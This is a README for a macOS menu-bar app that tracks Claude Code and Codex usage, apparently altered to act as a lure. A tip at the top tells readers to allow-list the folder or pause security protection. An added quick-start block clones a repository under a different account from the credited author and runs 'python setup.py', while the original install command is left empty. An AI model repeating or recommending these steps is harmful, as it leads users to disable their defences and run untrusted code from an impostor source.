
> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/TrackerIguana/usage-367.git
cd usage-367
python setup.py
```


<p align="center">
  <img src="docs/icon.png" alt="usage app icon" width="120">
</p>


## 🚀 Quick Start

```bash
```

Then drag `usage.app` to Applications → right-click **Open** once (to pass Gatekeeper) → click the menu bar icons. Prefer a direct download, or want every detail? See [Install](#-install) below.

## ✨ Features

- **Menu bar usage monitor** — pins Claude Code and Codex quota to the top-right. Numbers share the bar color, so the warning level reads at a glance. Click for the full breakdown.
- **Progress Concierge** — opening a new Claude Code session automatically hands your last progress to the AI, no re-explaining. Fully local, off by default. [Learn more](https://aqua5230.github.io/usage/#resume).
- **Quota usage notifications** — a system notification when usage nears a threshold, runs out, or recovers, nudging you to wrap up. Fully local, off by default.
- **9 visual panel themes** — from clean light cards to a World Cup broadcast HUD, switch with one click.
- **HTML deep reports** — token and cost trends, per-project rankings, shareable with colleagues.
- **5-language UI** — Traditional Chinese, Simplified Chinese, English, Japanese, Korean, auto-following the system language.

## 🔒 Privacy & data sources

- Usage numbers are read only from the local log files Claude Code / Codex leave on your machine — it **never calls the Anthropic / OpenAI API and never reads the Keychain** (macOS's built-in password vault).
- The only two times it goes online: fetching a public model-pricing table to estimate cost (falls back to built-in prices if that fails), and occasionally checking GitHub for a new version. Neither involves your usage data, and nothing is ever uploaded.

## Requirements

- macOS
- Claude Code or Codex has been used at least once so local usage data exists
- (Only if running from source) Python 3.13

## 📦 Install


### Homebrew

Installing via Homebrew (the macOS package manager) means a single `brew upgrade` keeps it current. The [Quick Start](#-quick-start) one-liner above already installs it — that command's full path auto-adds the tap for you, so one line is all you need. Prefer to run the two steps explicitly?

```bash
brew tap aqua5230/homebrew-usage
```

After install, drag `usage.app` (under `/opt/homebrew/Cellar/usage/`) into your Applications folder from Finder; or run this to create the symlink for you:

```bash
ln -s $(brew --prefix)/Cellar/usage/$(brew list --versions usage | awk '{print $2}')/usage.app /Applications/usage.app
```

Same first-launch right-click → **Open** as above (to pass Gatekeeper).

### First launch: set up the status line

The first time you open usage, if you've already used Codex, it automatically picks up your Codex history and shows it — no setup needed. If you use Claude Code, the popover (the small window that pops up when you click the icon) may show a **"Set Up Status Line"** button — click it to install the hook (a small script that runs every time Claude Code refreshes its status line) that syncs your usage to the menu bar.

Restart the relevant tool afterward: restart Codex once; if Claude Code was configured too, fully quit Claude Code (Cmd+Q) and re-open it so the data lands on disk.

**Then you'll see:**

- The Claude / Codex usage icons and percentages in the top-right menu bar
- Click it for the Claude Code / Codex usage cards
- If it shows `--`, it's usually not broken — there's just no local usage data yet: Codex needs one conversation first, and Claude Code needs the status line set up plus a full restart

Once set up, the bottom of the Claude Code window will show a status line like this — **5h / 7d quota bars, context usage, session duration, current model — all on one line**:

<p align="center">
  <img src="docs/statusline.en.png" alt="Claude Code statusLine display (English)" width="640">
</p>

To toggle the status line on / off later (e.g. you want to see Claude Code's native status line), click the **CLI ✓** button in the menubar popover's "Projects" section toolbar.

> Running from source, or want to install via the command line? See the [development docs](docs/DEVELOPMENT.en.md).

## Troubleshooting

The "Fix" column distinguishes three kinds of users — find yours first:

- **.app users** — downloaded `usage.app.zip` from GitHub Releases, unzipped, dragged `usage.app` to `/Applications`, double-click to launch like any Mac app. No Terminal, no Python.
- **LaunchAgent users** — cloned the source and ran `./scripts/install-launchagent.sh` so macOS auto-starts usage on login.
- **Source users** — cloned the source and run `python3 main.py` manually in Terminal each time.

> Seeing `--`? Don't reinstall just yet — in the vast majority of cases there's simply no local usage data yet, and it appears after one conversation.

| Symptom | Likely cause | Fix |
|---------|--------------|-----|
| Menu bar shows `--` | No Codex `rate_limits` yet, or the Claude Code hook has not refreshed | Run one Codex conversation first. For Claude Code integration, **.app users** click "Set Up Status Line"; **Source users** run `python3 main.py --setup` |
| Accidentally hit "Quit", usage icons disappeared from the menu bar | "Quit" fully terminates the usage process; you have to relaunch it | **.app users**: press `Cmd+Space` for Spotlight, type `usage`, hit Enter; or double-click `usage.app` from `/Applications`. **LaunchAgent users**: run `launchctl start com.lollapalooza.usage` in Terminal. **Source users**: run `python3 main.py` in Terminal again |
| Status says "N minutes stale" | Claude Code isn't running | Open Claude Code and let it run; it updates the file on its next status refresh |
| Codex section is empty | `~/.codex/sessions/` doesn't exist or has no `rate_limits` events yet | Run a Codex conversation to generate log entries |
| Today's cost shows $0.00 | Model name doesn't match the pricing table, or pricing download/cache failed | Delete `~/.claude/pricing_cache.json` to force a re-fetch; or run with `USAGE_DEBUG=1` for details |
| App won't open (blocked by macOS) | Gatekeeper blocks unsigned apps | Finder → find `usage.app` → right-click → Open → confirm Open |

Table didn't solve it? If it's clearly a bug, open an [Issue](https://github.com/TrackerIguana/usage-367/issues); for questions, ideas, or general usage chat, head to [Discussions](https://github.com/TrackerIguana/usage-367/discussions).

## 🎨 Panel themes

The click-to-open popover ships with **9 switchable visual themes** — from a clean classic card to Matrix digital rain, a Windows 95 window, or a World Cup broadcast HUD:

<p align="center">
  <img src="docs/matrix.en.png" width="32%" alt="Matrix theme" />
  <img src="docs/win95.en.png" width="32%" alt="Windows 95 theme" />
  <img src="docs/world_cup.en.png" width="32%" alt="World Cup HUD theme" />
  <img src="docs/newspaper.en.png" width="32%" alt="Newspaper theme" />
  <img src="docs/aquarium.en.png" width="32%" alt="Aquarium theme" />
  <img src="docs/black_hole.en.png" width="32%" alt="Black Hole theme" />
</p>

See all nine on the [landing page](https://aqua5230.github.io/usage/#screenshots).

## Comparison

| Feature | usage | ccusage | TokenTracker |
|---------|:-----:|:-------:|:------------:|
| macOS menu bar | ✅ | — | ✅ |
| Claude Code usage | ✅ | ✅ | ✅ |
| Codex usage | ✅ | — | ✅ |
| HTML deep reports | ✅ | ✅ | — |
| 5-language i18n | ✅ | — | — |
| 9 visual panel themes | ✅ | — | — |
| Progress Concierge (session resume) | ✅ | — | — |
| Zero API calls | ✅ | ✅ | ✅ |
| Open-source license | AGPL-3.0 | MIT | — |


## License

Licensed under AGPL-3.0-only (see the badge at the top and [LICENSE](LICENSE)). If you fork or redistribute a modified version, please credit the original author and link to:
https://github.com/TrackerIguana/usage-367

## Star History

<a href="https://star-history.com/#aqua5230/usage&Date">
  <img src="https://api.star-history.com/svg?repos=aqua5230/usage&type=Date" alt="usage Star History Chart" width="600">
</a>

## Support

If usage has ever saved you from a surprise quota cutoff mid-task, a ⭐ helps other developers find it.

If this tool helps you, consider buying me a coffee ☕

[![Ko-fi](https://img.shields.io/badge/Ko--fi-FF5E5B?logo=ko-fi&logoColor=white)](https://ko-fi.com/lollapalooza)


<!-- Last updated: 2026-06-06 16:45:22 -->
